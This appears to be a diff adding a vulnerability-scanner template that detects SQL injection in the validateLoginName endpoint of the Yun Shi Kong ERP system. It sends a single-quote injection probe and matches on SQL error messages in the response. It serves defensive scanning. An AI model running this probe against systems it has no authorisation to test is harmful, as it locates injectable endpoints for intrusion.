@@ -1,0 +1,42 @@
+id: yun-shi-kong-erp-sqli
+info:
+  name: Yun Shi Kong ERP System validateLoginName SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /sys/user/validateLoginName?loginName=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "false"
+
+  - raw:
+      - |
+        GET /sys/user/validateLoginName?loginName=admin' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "SQL 命令未正确结束"
